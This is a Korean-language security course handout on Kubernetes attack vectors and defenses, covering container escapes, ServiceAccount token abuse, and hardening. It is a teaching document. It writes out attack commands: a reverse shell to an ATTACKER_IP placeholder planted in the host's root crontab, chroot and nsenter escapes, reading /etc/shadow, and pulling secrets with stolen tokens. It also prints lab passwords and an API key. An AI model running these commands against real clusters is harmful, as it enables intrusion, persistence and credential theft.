# Week 12: Kubernetes 공격

## 학습 목표
- Kubernetes 환경의 주요 공격 벡터를 이해한다
- Pod 탈출(escape) 기법과 방어 방법을 익힌다
- ServiceAccount 토큰 악용 시나리오를 파악한다
- Kubernetes 공격 킬체인을 설명할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (Docker/클라우드/K8s 보안 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **컨테이너** | Container | 앱과 의존성을 격리하여 실행하는 경량 가상화 | 이삿짐 컨테이너 (어디서든 동일하게 열 수 있음) |
| **이미지** | Image (Docker) | 컨테이너를 만들기 위한 읽기 전용 템플릿 | 붕어빵 틀 |
| **Dockerfile** | Dockerfile | 이미지를 빌드하는 레시피 파일 | 요리 레시피 |
| **레지스트리** | Registry | 이미지를 저장·배포하는 저장소 (Docker Hub 등) | 앱 스토어 |
| **레이어** | Layer (Image) | 이미지의 각 빌드 단계 (캐싱 단위) | 레고 블록 한 층 |
| **볼륨** | Volume | 컨테이너 데이터를 영구 저장하는 공간 | 외장 하드 |
| **네임스페이스** | Namespace (Linux) | 프로세스를 격리하는 커널 기능 (PID, NET, MNT 등) | 칸막이 (같은 건물, 서로 안 보임) |
| **cgroup** | Control Group | 프로세스의 CPU/메모리 사용량을 제한하는 커널 기능 | 전기/수도 사용량 제한 |
| **오케스트레이션** | Orchestration | 다수의 컨테이너를 관리·조율하는 것 (K8s) | 오케스트라 지휘 |
| **Pod** | Pod (K8s) | K8s의 최소 배포 단위 (1개 이상의 컨테이너) | 같은 방에 사는 룸메이트들 |
| **RBAC** | Role-Based Access Control | 역할 기반 접근 제어 (K8s) | 직책별 출입 권한 |
| **PSP/PSA** | Pod Security Policy/Admission | Pod의 보안 설정을 강제하는 정책 | 건물 입주 조건 |
| **NetworkPolicy** | NetworkPolicy (K8s) | Pod 간 네트워크 통신 규칙 | 부서 간 출입 통제 |
| **Trivy** | Trivy | 컨테이너 이미지 취약점 스캐너 (Aqua) | X-ray 검사기 |
| **IaC** | Infrastructure as Code | 인프라를 코드로 정의·관리 (Terraform 등) | 건축 설계도 (코드 = 설계도) |
| **IAM** | Identity and Access Management | 클라우드 사용자/권한 관리 (AWS IAM 등) | 회사 사원증 + 권한 관리 시스템 |
| **CIS 벤치마크** | CIS Benchmark | 보안 설정 모범 사례 가이드 (Center for Internet Security) | 보안 설정 모범답안 |

---

# Week 12: Kubernetes 공격

## 학습 목표
- Kubernetes 환경의 주요 공격 벡터를 이해한다
- Pod 탈출(escape) 기법과 방어 방법을 익힌다
- ServiceAccount 토큰 악용 시나리오를 파악한다
- Kubernetes 공격 킬체인을 설명할 수 있다

---

## 1. Kubernetes 공격 킬체인

```
1. 초기 접근        → 취약한 웹 앱, 노출된 API 서버
2. 실행             → Pod 내 명령 실행
3. 권한 상승        → SA 토큰, privileged Pod
4. 횡적 이동        → 다른 Pod/노드 접근
5. 데이터 수집      → Secret, ConfigMap 수집
6. 목표 달성        → 데이터 유출, 암호화폐 채굴
```

### MITRE ATT&CK for Containers

| 전술 | Kubernetes 기법 |
|------|----------------|
| Initial Access | 노출된 Dashboard, API Server |
| Execution | exec into container, cronjob |
| Privilege Escalation | privileged Pod, hostPath |
| Lateral Movement | SA 토큰, 내부 서비스 접근 |
| Collection | Secret/ConfigMap 수집 |

---

## 2. Pod 탈출 (Container Escape)

> **이 실습을 왜 하는가?**
> "Kubernetes 공격" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> Docker/클라우드/K8s 보안 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 privileged Pod 탈출

> **실습 목적**: Kubernetes 환경의 주요 공격 벡터(privileged Pod 탈출, SA 토큰 악용)를 Docker로 시뮬레이션하여 이해하기 위해 수행한다
>
> **배우는 것**: --privileged 컨테이너에서 호스트 디스크와 프로세스에 접근 가능한 이유와, API 키(SA 토큰) 노출이 전체 시스템 장악으로 이어지는 공격 체인을 이해한다
>
> **결과 해석**: privileged 컨테이너에서 fdisk -l 성공은 호스트 탈출 가능 상태, --cap-drop ALL에서 실패는 방어 동작을 의미한다
>
> **실전 활용**: K8s 보안 감사에서 privileged Pod 탐지, SA 토큰 자동 마운트 비활성화, 감사 로깅 설정에 활용한다

```bash
# 공격자가 privileged Pod에 접근한 경우
# 호스트 파일시스템 마운트
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 호스트의 crontab에 리버스 셸 추가
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
  >> /mnt/host/var/spool/cron/crontabs/root
```

### 2.2 hostPath 악용

```yaml
# 위험한 Pod 정의
spec:
  containers:
    - name: evil
      image: ubuntu
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /          # 호스트 루트 전체 마운트!
```

```bash
# Pod 내부에서
chroot /host /bin/bash   # 호스트 셸 획득
cat /host/etc/shadow     # 호스트 비밀번호 해시 접근
```

### 2.3 hostPID + nsenter 탈출

```yaml
spec:
  hostPID: true          # 호스트 PID 네임스페이스 공유
  containers:
    - name: escape
      image: ubuntu
      securityContext:
        privileged: true
```

```bash
# Pod 내부에서 호스트의 init 프로세스(PID 1) 네임스페이스 진입
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# → 호스트 셸 획득
```

---

## 3. ServiceAccount 토큰 악용

### 3.1 자동 마운트된 SA 토큰

모든 Pod에는 기본적으로 ServiceAccount 토큰이 마운트된다.

```bash
# Pod 내부에서 SA 토큰 확인
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# CA 인증서
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 네임스페이스
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### 3.2 SA 토큰으로 API 서버 접근

```bash
# 토큰과 CA 설정
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# 현재 권한 확인
curl -sk $APISERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN"

# Secret 목록 조회 시도
curl -sk $APISERVER/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN"

# 새 Pod 생성 시도 (RBAC에 따라 허용/거부)
curl -sk $APISERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"evil"},...}'
```

### 3.3 과도한 SA 권한 체인

```
웹 앱 취약점 (RCE)
→ Pod 내부 셸 획득
→ SA 토큰 읽기
→ API 서버에서 Secret 조회
→ DB 비밀번호 획득
→ 데이터베이스 접근
→ 데이터 유출
```

---

## 4. 기타 공격 벡터

### 4.1 etcd 직접 접근

etcd가 인증 없이 노출되면 클러스터 전체 정보가 유출된다.

```bash
# etcd가 노출된 경우 (포트 2379)
etcdctl get / --prefix --keys-only
etcdctl get /registry/secrets/default/db-credentials
```

### 4.2 Kubelet API 악용

Kubelet API(포트 10250)가 인증 없이 노출된 경우:

```bash
# Pod 목록 조회
curl -sk https://NODE_IP:10250/pods

# Pod 내부에서 명령 실행
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=id"
```

### 4.3 노출된 Dashboard

```bash
# Kubernetes Dashboard가 인증 없이 노출된 경우
# 브라우저에서 접근 → 클러스터 전체 관리 가능
# 실제 사고: Tesla의 K8s Dashboard 노출 → 암호화폐 채굴
```

---

## 5. 방어 전략

### 5.1 Pod 보안

```yaml
spec:
  automountServiceAccountToken: false  # SA 토큰 마운트 금지
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
  containers:
    - securityContext:
        privileged: false
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
```

### 5.2 RBAC 강화

```yaml
# 최소 권한 ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-app-sa
  namespace: production
automountServiceAccountToken: false
```

### 5.3 감사 로깅

```yaml
# 감사 정책 (audit-policy.yaml)
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: RequestResponse    # 모든 요청/응답 기록
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]
  - level: Metadata           # 메타데이터만 기록
    resources:
      - group: ""
        resources: ["pods"]
```

---

## 6. 실습: 공격 시나리오 이해

### 실습 1: SA 토큰 개념 이해

```bash
# OpsClaw의 API 키 = K8s의 SA 토큰과 유사한 개념
# API 키가 노출되면 전체 시스템 제어 가능

# 올바른 인증
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects

# 인증 없이 시도 → 거부
curl -s http://localhost:8000/projects
```

### 실습 2: LLM으로 K8s 공격 시나리오 분석

K8s 공격 킬체인을 LLM에게 분석시킨다. RCE 획득 후 ServiceAccount 토큰을 통한 클러스터 장악까지의 단계별 공격 경로와 방어 방법을 확인한다.

```bash
# Ollama API로 K8s 공격 시나리오 분석 요청
# 교육 목적으로 킬체인과 방어 방법을 동시에 분석
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "Kubernetes 보안 전문가입니다. 교육 목적으로 공격 시나리오를 분석합니다."},
      {"role": "user", "content": "공격자가 취약한 웹 앱을 통해 Pod에 RCE를 얻었습니다. automountServiceAccountToken이 true이고 SA에 cluster-admin 권한이 있습니다. 공격 킬체인을 단계별로 설명하고, 각 단계의 방어 방법을 알려주세요."}
    ]
  }' | python3 -m json.tool
```

### 실습 3: Docker 환경에서 컨테이너 탈출 체험

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80

# privileged 컨테이너에서 호스트 정보 접근 (교육 목적)
docker run --rm --privileged alpine sh -c '
  echo "=== 호스트 커널 정보 ==="
  uname -a
  echo "=== 호스트 디스크 ==="
  fdisk -l 2>/dev/null | head -5
  echo "=== 호스트 프로세스 (hostPID 아님) ==="
  ls /proc | head -20
'

# 비privileged 컨테이너에서는 접근 불가
docker run --rm --cap-drop ALL alpine sh -c '
  fdisk -l 2>/dev/null || echo "디스크 접근 거부됨"
'
```

---

## 7. 공격 방어 체크리스트

- [ ] privileged Pod가 없는가?
- [ ] hostPath, hostNetwork, hostPID를 사용하지 않는가?
- [ ] SA 토큰 자동 마운트를 비활성화했는가?
- [ ] SA에 최소 권한만 부여했는가?
- [ ] API Server에 인증이 설정되어 있는가?
- [ ] etcd가 외부에 노출되지 않는가?
- [ ] Kubelet API에 인증이 설정되어 있는가?
- [ ] Dashboard가 외부에 노출되지 않는가?
- [ ] 감사 로깅이 활성화되어 있는가?

---

## 핵심 정리

1. K8s 공격은 취약한 앱 → Pod 셸 → SA 토큰 → 횡적 이동 순으로 진행된다
2. privileged Pod와 hostPath는 컨테이너 탈출의 주요 경로이다
3. SA 토큰이 자동 마운트되므로, 불필요 시 반드시 비활성화한다
4. etcd, Kubelet API, Dashboard의 노출은 클러스터 전체 장악으로 이어진다
5. 방어의 핵심은 최소 권한 + 네트워크 격리 + 감사 로깅이다

---

## 다음 주 예고
- Week 13: 클라우드 모니터링 - CloudTrail, CloudWatch 개념

---

---

## 심화: 컨테이너/클라우드 보안 보충

### Docker 보안 핵심 개념 상세

#### 컨테이너 격리의 원리

```
호스트 OS 커널
├── Namespace (격리)
│   ├── PID namespace  → 컨테이너마다 독립 프로세스 번호
│   ├── NET namespace  → 컨테이너마다 독립 네트워크 스택
│   ├── MNT namespace  → 컨테이너마다 독립 파일시스템
│   ├── UTS namespace  → 컨테이너마다 독립 hostname
│   └── USER namespace → 컨테이너 내 root ≠ 호스트 root (설정 시)
│
├── cgroup (자원 제한)
│   ├── CPU:    --cpus=2          → 최대 2코어
│   ├── Memory: --memory=512m     → 최대 512MB
│   └── IO:     --blkio-weight=500
│
└── Overlay FS (레이어 파일시스템)
    ├── 읽기 전용 레이어 (이미지)
    └── 읽기/쓰기 레이어 (컨테이너)
```

> **왜 컨테이너가 VM보다 가벼운가?**
> VM: 각각 전체 OS 커널을 포함 (수 GB)
> 컨테이너: 호스트 커널을 공유, 격리만 namespace로 (수 MB)
> 대신 격리 수준은 VM이 더 강하다 (커널 취약점 시 컨테이너 탈출 가능)

#### Dockerfile 보안 체크리스트

```dockerfile
# 나쁜 예
FROM ubuntu:latest          # ❌ latest 태그 (재현 불가)
RUN apt-get update && apt-get install -y curl vim  # ❌ 불필요 패키지
COPY . /app                 # ❌ 전체 복사 (.env 포함 가능)
RUN chmod 777 /app          # ❌ 과도한 권한
USER root                   # ❌ root 실행
EXPOSE 22                   # ❌ SSH 포트 (컨테이너에서 불필요)

# 좋은 예
FROM ubuntu:22.04@sha256:abc123...  # ✅ 특정 버전 + digest 고정
RUN apt-get update && apt-get install -y --no-install-recommends curl \
    && rm -rf /var/lib/apt/lists/*  # ✅ 최소 패키지 + 캐시 삭제
COPY --chown=appuser:appuser app/ /app  # ✅ 필요한 것만 + 소유자 지정
RUN chmod 550 /app          # ✅ 최소 권한
USER appuser                # ✅ 비root 사용자
HEALTHCHECK CMD curl -f http://localhost:8080 || exit 1  # ✅ 헬스체크
```

### 실습: Docker 보안 점검 (실습 인프라)

```bash
# web 서버의 Docker 상태 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "
  echo '=== Docker 버전 ===' && docker --version 2>/dev/null || echo 'Docker 미설치'
  echo '=== 실행 중 컨테이너 ===' && docker ps 2>/dev/null || echo '접근 불가'
  echo '=== Docker 소켓 권한 ===' && ls -la /var/run/docker.sock 2>/dev/null
" 2>/dev/null

# siem 서버의 Docker 상태 (OpenCTI가 Docker로 실행)
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 "
  echo '=== Docker 컨테이너 ===' && sudo docker ps --format 'table {{.Names}}\t{{.Image}}\t{{.Status}}' 2>/dev/null
  echo '=== Docker 네트워크 ===' && sudo docker network ls 2>/dev/null
" 2>/dev/null
```

### CIS Docker Benchmark 핵심 항목

| # | 항목 | 점검 명령 | 기대 결과 |
|---|------|---------|---------|
| 2.1 | Docker daemon 설정 | `cat /etc/docker/daemon.json` | userns-remap 설정 |
| 4.1 | 비root 사용자 | `docker inspect --format '{{.Config.User}}' <컨테이너>` | root가 아닌 사용자 |
| 4.6 | HEALTHCHECK | `docker inspect --format '{{.Config.Healthcheck}}' <컨테이너>` | 헬스체크 설정됨 |
| 5.2 | network_mode | `docker inspect --format '{{.HostConfig.NetworkMode}}' <컨테이너>` | host가 아닌 것 |
| 5.12 | --privileged | `docker inspect --format '{{.HostConfig.Privileged}}' <컨테이너>` | false |

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** Docker 컨테이너와 VM의 핵심 차이는?
- (a) 컨테이너가 더 안전  (b) **컨테이너는 호스트 커널을 공유, VM은 별도 커널**  (c) VM이 더 가벼움  (d) 차이 없음

**Q2.** '--cap-drop ALL'의 의미는?
- (a) 모든 파일 삭제  (b) **모든 Linux capability를 제거하여 권한 최소화**  (c) 네트워크 차단  (d) 로그 비활성화

**Q3.** 컨테이너가 --privileged로 실행되면 위험한 이유는?
- (a) 속도가 느려짐  (b) **호스트의 거의 모든 자원에 접근 가능 (탈출 가능)**  (c) 로그가 안 남음  (d) 이미지가 커짐

**Q4.** Trivy의 역할은?
- (a) 컨테이너 실행  (b) **컨테이너 이미지의 알려진 취약점(CVE) 스캐닝**  (c) 네트워크 설정  (d) 로그 수집

**Q5.** Dockerfile에서 USER root가 위험한 이유는?
- (a) 빌드가 느려짐  (b) **컨테이너 탈출 시 호스트 root 권한 획득 가능**  (c) 이미지가 커짐  (d) 네트워크 안 됨

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): Docker 29.3.0, Compose v5.1.1, juice-shop(User=65532,Privileged=false), OpenCTI 6컨테이너, opencti_default 네트워크
